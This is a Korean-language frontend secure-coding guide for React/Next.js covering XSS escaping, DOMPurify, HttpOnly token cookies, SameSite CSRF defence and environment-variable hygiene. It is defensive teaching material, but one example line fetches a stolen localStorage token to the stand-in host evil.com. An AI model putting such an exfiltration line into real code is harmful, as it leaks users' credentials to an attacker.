---
name: security
description: 프론트엔드 보안 코딩 규칙. XSS, CSRF, 인증 토큰 저장, 환경변수 관리. 보안 관련 코드 작성 시 사용.
refs:
  - https://owasp.org/www-project-top-ten/
  - https://cheatsheetseries.owasp.org/
---

# 프론트엔드 보안 가이드

## XSS (Cross-Site Scripting)

### React는 기본적으로 방어한다

JSX에서 `{}` 로 값을 렌더링하면 React가 자동으로 HTML 이스케이프한다.

```tsx
const userInput = '<script>alert(1)</script>'
return <div>{userInput}</div>
// → &lt;script&gt;alert(1)&lt;/script&gt; 로 텍스트 출력. 실행 안 됨 ✅
```

### dangerouslySetInnerHTML — 쓰면 안 된다

```tsx
// ❌ React 이스케이프 우회 → XSS 위험
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ 꼭 써야 한다면 DOMPurify로 먼저 sanitize
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

### innerHTML 절대 사용 금지

```tsx
// ❌ innerHTML — HTML로 파싱 → 이벤트 실행 가능
element.innerHTML = userInput

// ✅ textContent — 문자열 그대로, 파싱 안 함
element.textContent = userInput
```

---

## 인증 토큰 저장 위치

### localStorage는 쓰면 안 된다

```tsx
// ❌ XSS 한 방에 토큰 탈취 가능
localStorage.setItem('token', jwt)

// XSS 성공 시 공격자가 바로 읽을 수 있음
const token = localStorage.getItem('token')
fetch('https://evil.com?t=' + token)
```

### HttpOnly 쿠키가 맞다

```
Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly` → JS에서 `document.cookie` 접근 자체 불가 → XSS로 탈취 불가
- `Secure` → HTTPS에서만 전송
- `SameSite=Strict` → CSRF 방어

### 실무 패턴

```
Access Token  → 메모리(변수)에 저장. 새로고침 시 사라지지만 가장 안전
Refresh Token → HttpOnly 쿠키. JS에서 읽기 불가
```

---

## CSRF (Cross-Site Request Forgery)

쿠키는 자동 첨부되는 특성 때문에 다른 사이트에서 요청을 보내도 쿠키가 함께 전송된다.
`SameSite=Strict` 또는 `SameSite=Lax` 쿠키로 방어한다.

```
SameSite=Strict → 외부 사이트에서 오는 모든 요청에 쿠키 미포함 (가장 강력)
SameSite=Lax    → GET 요청은 허용, POST 등은 차단 (기본값)
SameSite=None   → 항상 전송 (Secure 필수) — 크로스 도메인 허용 시
```

---

## 환경변수 관리

```tsx
// ❌ 민감 정보를 NEXT_PUBLIC_ 으로 노출
NEXT_PUBLIC_API_SECRET=...  // 브라우저에서 읽힘

// ✅ 서버에서만 쓸 변수는 NEXT_PUBLIC_ 없이
API_SECRET=...              // 서버에서만 접근 가능

// ✅ 클라이언트에 필요한 것만 NEXT_PUBLIC_
NEXT_PUBLIC_API_URL=http://localhost:8080
```

**절대 커밋하면 안 되는 것들:**
- `.env` 파일 (`.gitignore`에 반드시 추가)
- API 키, 비밀번호, JWT 시크릿

---

## 시큐어 코딩 체크리스트

- [ ] `dangerouslySetInnerHTML` 사용 여부 확인. 쓴다면 DOMPurify sanitize 필수
- [ ] 외부 입력값을 `innerHTML`에 넣지 않는다
- [ ] 토큰을 `localStorage`에 저장하지 않는다
- [ ] 민감 정보를 `NEXT_PUBLIC_` 환경변수로 노출하지 않는다
- [ ] `.env` 파일이 `.gitignore`에 포함되어 있는지 확인
- [ ] API URL 등 공개해도 되는 값만 클라이언트에 노출
